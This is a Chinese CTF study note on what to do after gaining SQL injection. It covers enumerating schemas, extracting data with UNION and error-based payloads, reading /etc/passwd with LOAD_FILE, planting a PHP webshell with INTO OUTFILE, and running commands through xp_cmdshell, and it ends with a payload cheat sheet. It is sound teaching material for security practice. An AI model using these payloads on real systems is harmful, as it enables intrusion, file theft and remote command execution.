---
title: SQL 注入概览：拿到注入能力后去哪找 flag
category: SQL注入/概览
tags: [SQL注入, information_schema, load_file, INTO OUTFILE, sqlite_master, 信息收集, flag路径]
source: luvvvv 学习笔记《SQLI》
order: 2
---

## 一句话概括

拿到 SQL 注入能力之后，找 flag 的顺序应当遵循"**由近及远、由表及里**"：先在**当前数据库的系统表**里翻，再扩到**其它数据库 / 服务器文件**，最后才考虑**操作系统层面**的写文件与命令执行。

## 原理

出题人的目的是考察你的**注入技能和数据库知识**，不是故意刁难，所以 flag 通常放在一个"**合理且需要一定技巧才能到达**"的位置。由此可以划出三个层级。

### 第一层级：当前数据库的常见系统表

这是最直接、最可能的地方。拿到注入能力后，**第一件事永远是信息收集**——先搞清楚数据库的结构。

1. **核心系统表（元数据表）**

   这些表存储的是"数据库自身的结构信息"，比如所有其它的**表名**、**列名**。

   - **MySQL**：`information_schema` 这个数据库是宝库
     - `information_schema.tables`：存储所有表的信息
     - `information_schema.columns`：存储所有列的信息
   - **攻击流程**：

     | 步骤 | 目标 | 语句 |
     |---|---|---|
     | 第一步 | 爆库名 | `SELECT database()` |
     | 第二步 | 爆表名 | `SELECT table_name FROM information_schema.tables WHERE table_schema = '当前数据库名'` |
     | 第三步 | 爆列名 | `SELECT column_name FROM information_schema.columns WHERE table_name = '可疑表名'` |
     | 第四步 | 读取数据 | `SELECT 可疑列名 FROM 可疑表名` |

2. **Flag 的常见藏身之处**

   - 表名可能直接叫：`flag`、`flags`、`secret`、`passwords`、`admin`、`users`
   - 列名可能直接叫：`flag`、`secret`、`password`、`passwd`、`value`

   **所以首要任务就是通过查询 `information_schema`，找到名为 `flag` 或类似名称的表和列。**

> 为什么"先猜名字"是可行的：出题人要让你"找得到"，名字就不会太离谱。真正需要技巧的部分往往不是"表名叫什么"，而是"用什么手法把查询结果带出来"（回显 / 报错 / 布尔 / 时间 / 带外）。

### 第二层级：非默认数据库或特殊位置

当前数据库里翻不到，就要扩大搜索范围。

1. **其它数据库**：flag 可能在另一个独立的数据库里。
   **方法**：查 `information_schema.schemata` 拿到**所有数据库列表**，再逐个搜索。

2. **数据库文件本身（SQLite）**
   SQLite 没有 `information_schema`，但有系统表 **`sqlite_master`**，功能类似。
   **方法**：

   ```sql
   SELECT sql FROM sqlite_master WHERE type='table';
   ```

   它会返回每张表的建表语句，从这里读出表名与列名。

3. **用 `LOAD_FILE()` 读服务器文件（MySQL）**
   这是高阶技巧。如果数据库用户拥有 **`FILE` 权限**，就可以**直接读取服务器上的文件**——flag 可能被写在某个文本文件里，放在 Web 目录或其它位置。
   **方法**：

   ```sql
   SELECT LOAD_FILE('/etc/passwd');   -- 先拿来测试权限
   ```

   **常见 flag 路径**：

   ```text
   /flag
   /home/ctf/flag
   /var/www/html/flag.txt
   /var/lib/mysql-files/flag
   ```

   这需要你**猜测路径**，或者借助其它漏洞做路径探测。

### 第三层级：操作系统层面（Out-of-Band）

最困难、但确实存在的情况，通常出现在高难度题目中。

1. **用 `INTO OUTFILE` / `DUMPFILE` 写入 Web 目录**

   如果 flag 是动态生成的，或者你需要一个 WebShell 继续探测，可以用这条命令落地文件：

   ```sql
   SELECT '<?php system($_GET["c"]);?>' INTO OUTFILE '/var/www/html/shell.php';
   ```

   然后访问 `http://靶机地址/shell.php?c=cat /flag` 执行系统命令取 flag。

2. **利用数据库特性执行系统命令**

   | 数据库 | 手法 |
   |---|---|
   | **PostgreSQL** | `COPY ... FROM PROGRAM` 或 `pg_read_file()` |
   | **Microsoft SQL Server** | `xp_cmdshell` |
   | **MySQL** | 通常较难直接执行命令，可通过 **UDF（用户自定义函数）** 实现，这在 CTF 中较少见 |

## 利用条件

| 层级 | 前提 |
|---|---|
| 第一层（系统表） | 有可用的回显通道（联合查询 / 报错 / 盲注任一种） |
| 第二层 · 其它库 | 当前用户对其它库有读权限；`information_schema.schemata` 未被限制 |
| 第二层 · SQLite | 目标是 SQLite 而非 MySQL（两者系统表完全不同） |
| 第二层 · `LOAD_FILE` | MySQL 用户有 `FILE` 权限；`secure_file_priv` 为空或包含目标目录；目标文件**可被 MySQL 进程读取**（权限位） |
| 第三层 · `INTO OUTFILE` | 有 `FILE` 权限；目标目录**对 MySQL 进程可写**；`secure_file_priv` 放行；文件**不能已存在**（否则报错） |
| 第三层 · 系统命令 | 数据库与驱动都支持相应函数（`xp_cmdshell` 默认关闭，需开启） |

## Payload 速查

| 目的 | Payload |
|---|---|
| 当前库名 | `SELECT database()` |
| 当前用户 | `SELECT user()` / `SELECT current_user()` |
| 版本 | `SELECT version()` |
| 所有数据库 | `SELECT schema_name FROM information_schema.schemata` |
| 所有表名 | `SELECT table_name FROM information_schema.tables WHERE table_schema=database()` |
| 所有列名 | `SELECT column_name FROM information_schema.columns WHERE table_name='目标表'` |
| 一次拼出多行内容 | `SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()` |
| 读服务器文件 | `SELECT LOAD_FILE('/flag')` |
| 写文件（落 shell） | `SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/shell.php'` |
| SQLite 列表 | `SELECT sql FROM sqlite_master WHERE type='table'` |

## 完整示例：一次标准的四步信息收集

按第一层级的攻击流程走一遍（假设注入点是联合查询可用的回显位）：

```sql
-- 第一步：我在哪个库
SELECT database();
-- 结果：security

-- 第二步：这个库里有哪些表
SELECT group_concat(table_name) FROM information_schema.tables
WHERE table_schema = database();
-- 结果：users,emails,flag

-- 第三步：flag 表有哪些列
SELECT group_concat(column_name) FROM information_schema.columns
WHERE table_name = 'flag';
-- 结果：id,flag

-- 第四步：把内容取出来
SELECT flag FROM flag;
```

对应的注入写法（假设注入点在三列回显位）：

```sql
' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database() --
```

没回显位就换成报错注入：

```sql
1' AND extractvalue(1, concat(0x7e, (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()))) --
```

再没有就降到布尔盲注 / 时间盲注，逐字符猜（具体手法见 `布尔盲注-原理与利用`）。

## 踩坑与备注

- **SQLite 是另一套体系**：它没有 `information_schema`，取而代之的是 `sqlite_master`（原文写的是"系统表 `sqlite_master`，功能类似"）。遇到 SQLite 题目时全套 MySQL 语法都要换成 SQLite 语法。
- **`LOAD_FILE()` 不是万能的**：需要 `FILE` 权限，还受 `secure_file_priv` 限制；读不到时可以先退回系统表路线，或者改用 `INTO OUTFILE` 试探目录可写性。
- **`INTO OUTFILE` 写入的文件不能已存在**：同名文件存在时 MySQL 会直接报错，这也是它的一个"探测用"的副作用。
- **`xp_cmdshell` 默认是关的**：原文把它列为"利用数据库特性执行系统命令"的一种，实际需要先有足够权限把它打开。
- **常见 flag 路径列表**来自原文，属于**经验值**而非穷举，实际做题时应当结合题目环境（Web 根目录、`/home/<用户名>/`、环境变量文件等）一起猜。
- 本篇只讲"往哪里找"。至于"怎么把数据带出来"的完整手法谱系，见 `SQL注入底层原理-解析与执行的博弈` 第 6 节的对照表。
